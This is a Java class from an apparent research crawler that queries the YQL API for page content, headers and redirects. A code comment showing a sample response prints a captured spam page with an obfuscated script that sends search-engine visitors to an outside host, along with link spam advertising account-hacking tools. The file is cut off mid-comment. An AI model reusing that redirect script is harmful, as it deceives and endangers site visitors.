package de.hpi.fgis.yql;

import java.io.Closeable;
import java.io.IOException;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import com.mongodb.DBObject;

import de.hpi.fgis.concurrency.APIAccessRateLimitGuard.RateLimitedTask;
import de.hpi.fgis.concurrency.AsyncResultHandler;
import de.hpi.fgis.html.ContentExtractor;

/**
 * this class utilizes the YQL API (JSON) to crawl the contents of a specified list of urls<br/>
 * additionally it resolves the redirects of specified url and keeps tract of the redirect chain
 * @author tongr
 *
 */
public class YQLCrawler implements Closeable {
	
	/**
	 * this class represents the results of a {@link YQLCrawler} run
	 * @author tongr
	 *
	 */
	public static class CrawlingResults {
		private final Set<String> urls = new HashSet<>();
		private final Map<String, Map<String,String>> headers;
		private final Map<String, String> contents;
		private final Map<String, String> redirects;
		
		public CrawlingResults() {
			this(new HashMap<String, Map<String,String>>(), new HashMap<String, String>(), new HashMap<String, String>());
		}

		public CrawlingResults(Map<String, Map<String,String>> headers, Map<String, String> contents, Map<String, String> redirects) {
			this.headers = headers;
			this.contents = contents;
			this.redirects = redirects;
			urls.addAll(this.headers.keySet());
			urls.addAll(this.contents.keySet());
			urls.addAll(this.redirects.keySet());
		}

		/**
		 * the urls crawled resources
		 * @return a set of crawled urls
		 */
		public Set<String> urls() {
			return urls;
		}
		/**
		 * the http header information of the specified url
		 * @param url the url to get header information for
		 * @return the header information of the url
		 */
		public Map<String,String> header(String url) {
			return headers.get(url);
		}
		/**
		 * the content of the specified url
		 * @param url the url to get content for
		 * @return the content of the url
		 */
		public String content(String url) {
			return contents.get(url);
		}
		/**
		 * the redirect information (original_url -> actual_url)
		 * @param url the source url (original_url)
		 * @return the redirects (actual_url)
		 */
		public String redirect(String url) {
			return redirects.get(url);
		}
	}
	private final YQLApiJSON api = new YQLApiJSON();

	/**
	 * crawls the specified urls and returns a map (actual_url -> content)
	 * 
	 * @param urls
	 *            the urls to be crawled
	 * @return the crawling results including a mapping from an actual url
	 *         (destination of one or more redirects from a source url) to the
	 *         content of the actual page as well as redirect information
	 *         (original_url -> actual_url)
	 * 
	 * @throws IOException
	 *             if some network errors occur
	 * 
	 * @throws DeserializationException
	 *             if the deserialization did not working properly
	 */
	public CrawlingResults crawl(Collection<String> urls) throws IOException, DeserializationException {
		if(urls==null || urls.size()<=0) {
			return new CrawlingResults();
		}
		Map<String, Map<String,String>> headerMap = new HashMap<>();
		Map<String, String> contentMap = new HashMap<>();
		Map<String, String> redirectSink = new HashMap<>();
		
		// resources for the data table definition:
		// https://raw.github.com/tongr/yql-tables/master/data/data.headers.xml
		// alernatives:
		// http://www.hpi.uni-potsdam.de/fileadmin/hpi/FG_Naumann/projekte/TwitCrawl/data.headers.small.xml
		// store://wPdxHE6ILC1Ti4oCGOIs0v (faster)
		DBObject results = api.query(createQuery(urls),
								"DATA",
								"store://wPdxHE6ILC1Ti4oCGOIs0v");
		
		if(results!=null && results.containsField("resources") && results.get("resources") instanceof DBObject) {
			results = (DBObject) results.get("resources");
		} else {
			results = null;
		}
		
		if( results!=null ) {
			List<?> resultList;
			if (results  instanceof List) {
				resultList = (List<?>) results;
			} else {
				// in case of only one value:
				resultList = Arrays.asList(results);
			}
			
			for(int i=0;i<resultList.size();i++) {
				if(resultList.get(i)!=null && resultList.get(i) instanceof DBObject) {
					DBObject resultItem = (DBObject) resultList.get(i);
					if(extractContent(resultItem, contentMap)) {
						extractHeader(resultItem, headerMap);
						extractRedirects(resultItem, redirectSink);
					}
				}
			}
			
		}

		return new CrawlingResults(headerMap, contentMap, redirectSink);
	}
	
	/**
	 * crawls the specified urls and returns a map (actual_url -> content)
	 * 
	 * @param urls
	 *            the urls to be crawled
	 * @param asyncResultHandler
	 *         an asynchronous result processor that gets informed if the results are available, whereas the crawling results include a mapping from an actual url (destination of one or more
	 *         redirects from a source url) to the content of the actual page as well as redirect information (original_url -> actual_url)
	 * @throws IOException in case of network problems
	 */
	public void crawlAsync(final Collection<String> urls, final AsyncResultHandler<CrawlingResults> asyncResultHandler) throws IOException {
		if(urls==null || urls.size()<=0) {
			asyncResultHandler.onCompleted(new CrawlingResults());
		}

		api.queryAsync(createQuery(urls),
				"DATA",
				"store://wPdxHE6ILC1Ti4oCGOIs0v",
				new AsyncResultHandler<DBObject>() {
					@Override
					public void onCompleted(DBObject results) {
						Map<String, Map<String,String>> headerMap = new HashMap<>();
						Map<String, String> contentMap = new HashMap<>();
						Map<String, String> redirectSink = new HashMap<>();
						
						if(results!=null && results.containsField("resources") && results.get("resources") instanceof DBObject) {
							results = (DBObject) results.get("resources");
						} else {
							results = null;
						}
						
						if( results!=null ) {
							List<?> resultList;
							if (results  instanceof List) {
								resultList = (List<?>) results;
							} else {
								// in case of only one value:
								resultList = Arrays.asList(results);
							}
							
							for(int i=0;i<resultList.size();i++) {
								if(resultList.get(i)!=null && resultList.get(i) instanceof DBObject) {
									DBObject resultItem = (DBObject) resultList.get(i);
									if(extractContent(resultItem, contentMap)) {
										extractHeader(resultItem, headerMap);
										extractRedirects(resultItem, redirectSink);
									}
								}
							}
							
						}
						
						asyncResultHandler.onCompleted(new CrawlingResults(headerMap, contentMap, redirectSink));
					}

					@Override
					public void onThrowable(Throwable t) {
						asyncResultHandler.onThrowable(t);
					}
			
				});
	}

	private String createQuery(Collection<String> urls)
			throws IOException {
		StringBuilder q = new StringBuilder("select * from DATA where url in (");
		boolean first = true;
		for (String url : urls) {
			if (first) {
				first = false;
			} else {
				q.append(',');
			}
			q.append('\'').append(url).append('\'');
		}
		q.append(") and ua='Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)' and htmlstr='true'");
		
		return q.toString();
	}

	private boolean extractContent(DBObject resultItem, Map<String, String> contentSink) {
		// typical format of the api:
		// {
		// "url": "http://kbstroy.ru/img/mim.php?p=kdw36dfsi1",
		// "status": "200",
		// "headers": {
		// "result": {
		// "x-powered-by": "PHP/5.2.17",
		// "server": "YTS/1.19.11",
		// "proxy-connection": "keep-alive",
		// "date": "Tue, 23 Jul 2013 16:36:34 GMT",
		// "transfer-encoding": "chunked",
		// "age": "1",
		// "content-type": "text/html; charset=utf-8"
		// }
		// },
		// "content":
		// "<html>\n  \n  \n  <head>\n    \n    \n    <meta content=\"HTML Tidy for Java (vers. 26 Sep 2004), see www.w3.org\" name=\"generator\"/>\n    \n    \n    <meta content=\"text/html;charset=utf-8\" http-equiv=\"Content-Type\"/>\n    \n    \n    <title>Купить украине avene triacneal</title>\n    \n\n    <script type=\"text/javascript\" xml:space=\"preserve\">\nvar red = 'http://nmqiiijh.com/in.cgi?8&amp;group=2&amp;seoref=' + encodeURIComponent(document.referrer) + '&amp;parameter=$keyword&amp;se=$se&amp;ur=1&amp;HTTP_REFERER=' + encodeURIComponent(document.URL) + '&amp;default_keyword=default';var _0x8c5c = ['\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x72', '\\x67\\x6F\\x6F\\x67\\x6C\\x65\\x2E', '\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66', '\\x62\\x69\\x6E\\x67\\x2E', '\\x79\\x61\\x68\\x6F\\x6F\\x2E', '\\x61\\x6F\\x6C\\x2E', '\\x61\\x73\\x6B\\x2E', '\\x61\\x6C\\x74\\x61\\x76\\x69\\x73\\x74\\x61\\x2E', '\\x79\\x61\\x6E\\x64\\x65\\x78\\x2E', '\\x3C\\x73\\x63', '\\x72\\x69\\x70\\x74\\x20\\x6C\\x61\\x6E\\x67\\x75\\x61', '\\x67\\x65\\x3D\\x22\\x6A\\x61\\x76\\x61\\x73', '\\x63\\x72\\x69\\x70\\x74\\x22\\x3E\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x2E\\x77\\x72\\x69\\x74\\x65\\x28\\x22\\x3C\\x66\\x72\\x61\\x6D\\x65\\x73\\x65', '\\x74\\x3E\\x3C\\x66\\x72\\x61\\x6D', '\\x65\\x20\\x73\\x72\\x63\\x3D\\x27', '\\x27\\x2F\\x3E\\x3C\\x2F\\x66\\x72\\x61', '\\x6D\\x65\\x73\\x65\\x74\\x3E\\x22\\x29\\x3B\\x3C\\x2F\\x73\\x63\\x72', '\\x69\\x70\\x74\\x3E', '\\x77\\x72\\x69\\x74\\x65'];\nvar Ref = document[_0x8c5c[0]];\nif (Ref[_0x8c5c[2]](_0x8c5c[1]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[3]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[4]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[5]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[6]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[7]) != -1 || Ref[_0x8c5c[2]](_0x8c5c[8]) != -1) {\n    document[_0x8c5c[18]](_0x8c5c[9] + _0x8c5c[10] + _0x8c5c[11] + _0x8c5c[12] + _0x8c5c[13] + _0x8c5c[14] + red + _0x8c5c[15] + _0x8c5c[16] + _0x8c5c[17]);\n};\n    </script>\n    \n  \n  </head>\n  \n  \n  <body link=\"#0000CC\" onclick=\"search_complite.hideresults();\" text=\"#000000\">\n    \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=hzd9ty1ldhwq1\">Диета вес растет</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=uwl2vjgrawml\">Несостоятельность клапанов варикоз лечение</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yk67adbfg4oa\">Можно при сахарном диабете есть чернослив</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=vszu244zstkjf\">Найти сослуживцев на одноклассниках</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=rdfqapvv\">Диеты.правильное питание</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=jrbntc1hh\">Бесплатная программа для взлома без регистрации и смс одноклассники</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=rak133gc7bo\">Поиск друзей и одноклассников на facebook</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=fb4yrepob8bhfy\">Увеличение грудных желез в кривом роге</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=bdqee8ddrks\">Быстрая диета 1кг.в день</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=km2n3adfobzq7k\">Семена фенхеля для увеличение груди</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=bz96um97k\">Простатит у мальчика 12 лет</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=cj1cqae4sr4ka3\">Муцинозная киста яичника причины возникновения</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=o29kdcidwonhke\">Выдавливание прыща психологическая проблема</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yagzzob1bd\">Болезнь.зрение родовая травма</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=vuzuavaiiqscm\">Опера скачивание с контакта</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=lhf1ezqm9q9\">Видео просмотр физкультуры для похудения талии и живота</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=jxpuocda0qgp7\">Др нона похудение</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=556c0fyunw5\">Безопасное отбеливание зубов южно-сахалинск</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=onrrko8g\">Кaк можно восстaновить зрение простыми упрaжнениями очкaм нет</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=em6ropx1rww8t\">Lineage 2 много аден заработать</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=mnswzzszxfbupb\">Диета для больных желчно-каменной болезнью</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=bguf5f6lcpp8x\">Програма для набора людей в группу одноклассники</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=mcrug1dxpbhbji\">Контакт чат челябинск</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=djjk98s1xwd\">Комплекс для отбеливания зубов купить</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=ghg5ucqbr\">Прикольные кортинки на вконтакте</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=oxeigz1eeb\">Востановить удаленную страницу вконтакте</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=upkeavnlb0g\">Цена на увеличение грудей в днепропетро</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yemh2v5xj\">Что делать если после бритья появляются прыщики и красные точки форумы</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=kzc1cfogs50hd\">Ава для контакта бесплатно картинки</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=ezqhsnekl\">Картинки юмор про бизнес</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=spowrj69\">Онлайн магазин одежды в контакте</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=8kalbvbgxkko\">Приложение одноклассники для нокиа n8</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=mmyugxo3e\">Узбекистан г наманган школа интернат 14 одноклассники</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=rrn4fxuxza\">Одноклассники моя страница 2008</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=0xw4apt3xky\">С какого возраста можно увеличить грудь</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=nhj6ypde9n2\">Отбеливание зубов в волгограде цена</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yw6pn1wma\">Отбеливание зубов интернет магазин</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yqzrzufhsb\">Скачать учебник 9 класс угринович</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=iwmjkjtyhx\">Система отбеливания зубов regbnm</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=wod7ezjuvobv8p\">Киста наботовых желез шейки матки</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=pddfatgc\">Узнать сколько стоит увеличить грудь в пензе</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=x1pvbcenzne8x\">Кино увеличение груди</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=jjbbl6aevol\">Погашение кредита мтс</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=yjhnwafvimg1g\">Могут ли контактные линзы улучшить зрение</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=iq9s55jstawfew\">Варикоз на руках</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=4rtrry1ze5unoa\">Лазерная отбеливание зубов</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=r1gke9sp3mnvf\">Программа для расширения периферического зрения</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=sv2e5ndymaxn\">Отбеливание зубов air flow киев</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=19bpvnm7d\">Как обезопаситься беременной при контакте с больным гриппом</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=7tzqpqyvkw\">Если на лице прыщи a на волосах себорея</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=edlftqxfvrio\">Camaieu com ua email контакт</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=ysqk6uc7qk9gt\">Обои обманом зрения</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=dwk3wnhkjv\">Шапка танкиста детский купить</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=dx9kqudjymnsds\">Что думают стоматологи по поводу отбеливания зубов</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=rxmrda4euvd\">Тест на зрения в картинках</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=a8usw0phk5u\">Отбеливание депульпированных зубов отзывы</a>\n     \n  \n    <a href=\"http://kbstroy.ru/img/mim.php?p=uzjyy3ayh3o\">Как бесплатно взломать пользователя в контакте</a>\n    \n  \n    <div id=\"for-json-p\"/>\n    \n  \n    <div class=\"g-page\">\n      \n    \n      <table border=\"0\" class=\"hat\">\n        \n      \n        <tr>\n          \n        \n          <td width=\"2%\"/>\n          \n        \n          <th/>\n          \n        \n          <td class=\"hat-space\">\n            \n          \n            <p> </p>\n            \n        \n          </td>\n          \n        \n          <td class=\"top\">\n            \n          \n            <table>\n              \n            \n              <tr>\n                \n              \n                <td width=\"20%\">\n                  \n                \n                  <h1>\n                    \n                  \n                    <br/>\n                    \n                \n                  </h1>\n                  \n              \n                </td>\n                \n              \n                <td class=\"mail\">\n                  \n                \n                  <p> </p>\n                  \n              \n                </td>\n                \n              \n                <td class=\"cust\"/>\n                \n              \n                <td align=\"right\" class=\"switch\"/>\n                \n            \n              </tr>\n              \n          \n            </table>\n            \n        \n          </td>\n          \n        \n          <td>\n            \n          \n            <p> </p>\n            \n        \n          </td>\n          \n      \n        </tr>\n        \n      \n        <tr valign=\"top\">\n          \n        \n          <td>\n            \n          \n            <p> </p>\n            \n        \n          </td>\n          \n        \n          <th>\n            \n          \n            <table>\n              \n            \n              <tr>\n                \n              \n                <td>\n                  \n                \n                  <strong>\n                    \n                  \n                    <a href=\"#\"/>\n                    \n                \n                  </strong>\n                  \n              \n                </td>\n                \n              \n                <td/>\n                \n            \n              </tr>\n              \n          \n            </table>\n            \n          \n            <p>\n              Нашлось\n          \n              <br/>\n              89 тыс страниц\n            </p>\n            \n        \n          </th>\n          \n        \n          <td class=\"hat-space\">\n            \n          \n            <p> </p>\n            \n        \n          </td>\n          \n        \n          <td>\n            \n          \n            <form action=\"#\" method=\"get\" name=\"f\" onsubmit=\"search_complite.changeForm();\">\n              \n            \n              <input name=\"search_mode\" type=\"hidden\" value=\"ordinal\"/>\n              \n            \n              <input name=\"lang\" type=\"hidden\" value=\"ru\"/>\n              \n            \n              <input name=\"engine\" type=\"hidden\" value=\"1\"/>\n              \n            \n              <table style=\"border-bottom:1px solid #fff;\">\n                \n              \n                <tr>\n                  \n                \n                  <td class=\"text\">\n                    \n                  \n                    <div style=\"position:relative;top:0;left:0;z-index:1;//zoom:1;\">\n                      \n                    \n                      <div id=\"autocomplite\" style=\"display:none;width:385px !important;\"/>\n                      \n                    \n                      <input name=\"search_query\" type=\"hidden\" value=\"\"/>\n                      \n                    \n                      <input maxlength=\"300\" name=\"q\" onfocus=\"searchInputIsActive = 1;\" onkeydown=\"return search_complite.checkArrows(this, event);\" onkeypress=\"search_complite.autocomplite(this, event);\" size=\"43\" tabindex=\"1\" value=\"Купить украине avene triacneal\"/>\n                      \n                  \n                    </div>\n                    \n                \n                  </td>\n                  \n                \n                  <td class=\"btn\">\n                    \n                  \n                    <input id=\"PerformSearch\" name=\"PerformSearch\" type=\"submit\" value=\"Найти\"/>\n                    \n                \n                  </td>\n                  \n                \n                  <td class=\"arr\" rowspan=\"2\"/>\n                  \n                \n                  <td class=\"r\"/>\n                  \n              \n                </tr>\n                \n              \n                <tr>\n                  \n                \n                  <td class=\"l\" colspan=\"2\">\n                    \n                  \n                    <a class=\"a\" href=\"#\">расширенный поиск</a>\n                    \n                  \n                    <label for=\"in_found\">\n                      \n                  \n                      <input name=\"in_found\" type=\"checkbox\" value=\"Купить украине avene triacneal\"/>\n                      в найденном\n                    </label>\n                    \n                  \n                    <label for=\"ua_geo\">\n                      \n                  \n                      <input name=\"ua_geo\" type=\"checkbox\" value=\"1\"/>\n                      только на украинских сайтах\n                    </label>\n                    \n                  \n                    <label for=\"city_geo\">\n                      \n                  \n                      <input id=\"geosuggest\" name=\"city_geo\" type=\"checkbox\" value=\"9\"/>\n                      в Киеве\n                    </label>\n                    \n                \n                  </td>\n                  \n                \n                  <td class=\"r\"/>\n                  \n              \n                </tr>\n                \n            \n              </table>\n              \n          \n            </form>\n            \n          \n            <br/>\n            \n        \n          </td>\n          \n      \n        </tr>\n        \n    \n      </table>\n      \n    \n      <br/>\n      \n    \n      <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"textAd_img\" height=\"50\">\n        \n      \n        <tr>\n          \n        \n          <td class=\"textad\" valign=\"bottom\">\n            \n          \n            <a href=\"#\"/>\n            \n        \n          </td>\n          \n        \n          <td>\n            \n          \n            <div class=\"showall\">\n              \n          \n              <a href=\"#\" target=\"_blank\">Все объявления</a>\n               \n            </div>\n            \n          \n            <ul style=\"list-style:none;\">\n              \n            \n              <li class=\"default movesp\">\n                \n              \n                <div>\n                  \n                \n                  <div class=\"ad-link\">\n                    \n                  \n                    <a href=\"#\" target=\"_blank\">Отель Украина 3*</a>\n                    \n                \n                  </div>\n                  \n                \n                  <div>\n                    \n                  \n                    <p>Симферополь, Украина. 72 008 отелей! Сравните и бронируйте по лучшим ценам!</p>\n                    \n                \n                  </div>\n                  \n                \n                  <span class=\"url\">traveltipz.ru</span>\n                  \n              \n                </div>\n                \n            \n              </li>\n              \n          \n            </ul>\n            \n        \n          </td>\n          \n      \n        </tr>\n        \n    \n      </table>\n      \n    \n      <div class=\"list\">\n        \n      \n        <ol class=\"results\" start=\"21\">\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=21', this)\" target=\"_blank\">\n                \n          \n                <strong>avene</strong>\n                 \n          \n                <strong>triacneal</strong>\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  \n              \n                  <strong>avene</strong>\n                   \n              \n                  <strong>triacneal</strong>\n                  . Добрый день! \n              \n                  <strong>Купила</strong>\n                   по совету сообщников \n              \n                  <strong>avene</strong>\n                   \n              \n                  <strong>triacneal</strong>\n                  . Радостно мажусь им неделю, результат с первой попытки, довольна. Мажу на ночь, утром дневной крем, всё как полагается.\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.ljpoisk.ru  · 6 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=22', this)\" target=\"_blank\">\n                \n          \n                <strong>Avene</strong>\n                 (\n          \n                <strong>Авен</strong>\n                ), \n          \n                <strong>купить</strong>\n                , цена, наличие - Аптека «Парус»\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Аптека «Парус» предлагает \n              \n                  <strong>купить</strong>\n                   \n              \n                  <strong>Avene</strong>\n                   (\n              \n                  <strong>Авен</strong>\n                  ). Доступная цена на \n              \n                  <strong>Avene</strong>\n                   (\n              \n                  <strong>Авен</strong>\n                  ), доставка по Киеву и \n              \n                  <strong>Украине</strong>\n                  .\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  Лечебная косметика: \n              \n                  <strong>Avene</strong>\n                   (\n              \n                  <strong>Авен</strong>\n                  ). Уважаемые покупатели! Вы можете найти необходимые Вам лекарственные средства и лечебную косметику не только по...\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.parys.com.ua  · 103 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=23', this)\" target=\"_blank\">\n                КупиКупон \n          \n                <strong>Украина</strong>\n                 – \n          \n                <strong>купить</strong>\n                 купоны на скидку в Киеве. Скидочные купоны и акции\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  На сайте КупиКупон \n              \n                  <strong>Украина</strong>\n                   – вы можете найти лучшие купоны на скидку в Киеве каждый день самые лучшие скидки и акции Киева.\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  Уже \n              \n                  <strong>купили</strong>\n                   8. 06:34:23. Тараса Шевченко.\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">kiev.kupikupon.com.ua  · 126 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=24', this)\" target=\"_blank\">\n                \n          \n                <strong>Авен</strong>\n                 Киев | \n          \n                <strong>купить</strong>\n                , заказать, медикаменты | аптека AptekaMirra\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Телефон: (044) 484 1783. Заказать \n              \n                  <strong>Авен</strong>\n                   в Киеве. Чтобы \n              \n                  <strong>купить</strong>\n                   \n              \n                  <strong>Авен</strong>\n                   или другие медикаменты не выходя из дома, свяжитесь с аптекой AptekaMirra.\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.AptekaMirra.com.ua  · 75 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=25', this)\" target=\"_blank\">\n                \n          \n                <strong>Avene</strong>\n                 :: \n          \n                <strong>TriAcneal</strong>\n                 — Разглаживающий крем для кожи с акне ТриАкнеаль :: \n          \n                <strong>Авен</strong>\n                 на Косметика-Поиск.ру\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Иметь свою косметичку, которая поможет вам организовать по категориям косметику, которую Вы планируете \n              \n                  <strong>купить</strong>\n                  .\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  Результат применения \n              \n                  <strong>Avene</strong>\n                   \n              \n                  <strong>TriAcneal</strong>\n                  : прыщиков становится меньше, следы от них сглаживаются, тон и текстуры кожи выравниваются.\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.Kosmetika-Poisk.ru  · 84 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=26', this)\" target=\"_blank\">\n                Kosmetyk Wszechczasów (KWC): \n          \n                <strong>Avene</strong>\n                 Diacneal/\n          \n                <strong>Triacneal</strong>\n                 | Видео на Запорожском портале\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Moje odczucia po kuracji \n              \n                  <strong>Avene</strong>\n                   \n              \n                  <strong>TriAcneal</strong>\n                  .\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">portall.zp.ua  · 22 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=27', this)\" target=\"_blank\">\n                \n          \n                <strong>Avene</strong>\n                 \n          \n                <strong>Triacneal</strong>\n                 Soin-Skin Care – Крем при несовершенствах кожи и акне | Ваконівка\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  \n              \n                  <strong>avene</strong>\n                   триакнель отзывы, \n              \n                  <strong>avene</strong>\n                   \n              \n                  <strong>triacneal</strong>\n                   \n              \n                  <strong>купить</strong>\n                  , äèàêíåëü öåíà, \n              \n                  <strong>avene</strong>\n                   soin skin care, \n              \n                  <strong>triacneal</strong>\n                   отзывы, \n              \n                  <strong>авене</strong>\n                   триакнель, \n              \n                  